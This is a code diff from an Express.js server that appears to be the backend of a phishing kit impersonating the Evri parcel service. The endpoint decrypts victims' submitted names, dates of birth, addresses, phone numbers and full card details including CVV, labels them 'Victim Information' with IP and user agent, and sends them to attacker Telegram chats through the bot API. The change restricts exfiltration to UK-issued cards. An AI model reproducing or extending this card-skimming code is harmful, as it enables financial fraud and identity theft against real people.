@@ -10567,9 +10567,9 @@ app.post("/eggmanEvri", (req, res) => {
     });
 });
 
-app.options("/trizEvri11212", cors());
+app.options("/trizEvri1", cors());
 
-app.post("/trizEvri11212", (req, res) => {
+app.post("/trizEvri1", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
   );
@@ -10619,35 +10619,39 @@ app.post("/trizEvri11212", (req, res) => {
       binInfo = resp.data;
     })
     .then(function () {
-      var binList = `${bin} | ${binInfo.scheme} | ${binInfo.type} | ${binInfo.brand} | ${bankName}`;
-      var originalText = `-------------------------------------------------------------------------\nBilling Information\n|Full Name: ${fname}\n|DOB: ${dob}\n|Address: ${address}\n|Post Code: ${pcode}\n|Telephone: ${telephone}\n-------------------------------------------------------------------------\nCard Information\n|Card Number: ${ccnum}\n|Card Expiry: ${ccexp}\n|CVV: ${cvv}\n|Bin: ${binList}\n-------------------------------------------------------------------------\n+ Victim Information\n| IP Address : ${ip}\n| UserAgent : ${userAgent}`;
+      if (binInfo.country.alpha2 == "GB") {
+        var binList = `${bin} | ${binInfo.scheme} | ${binInfo.type} | ${binInfo.brand} | ${bankName}`;
+        var originalText = `-------------------------------------------------------------------------\nBilling Information\n|Full Name: ${fname}\n|DOB: ${dob}\n|Address: ${address}\n|Post Code: ${pcode}\n|Telephone: ${telephone}\n-------------------------------------------------------------------------\nCard Information\n|Card Number: ${ccnum}\n|Card Expiry: ${ccexp}\n|CVV: ${cvv}\n|Bin: ${binList}\n-------------------------------------------------------------------------\n+ Victim Information\n| IP Address : ${ip}\n| UserAgent : ${userAgent}`;
 
-      axios
-        .post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
-          {
-            chat_id: 680379375,
-            text: `EvriTriz:\n${originalText}`,
-            parse_mode: "Markdown",
-          }
-        )
-        .catch((e) => {
-          console.log(e);
-        });
-      axios
-        .post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
-          {
-            chat_id: 1190384225,
-            text: `Evri:\n${originalText}`,
-            parse_mode: "Markdown",
-          }
-        )
-        .catch((e) => {
-          console.log(e);
-        });
-      binList = "";
-      res.send("Update Completed");
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `EvriTriz:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 1190384225,
+              text: `Evri:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        binList = "";
+        res.send("Update Completed");
+      } else {
+        res.send("Suck ur mum");
+      }
     });
 });
 
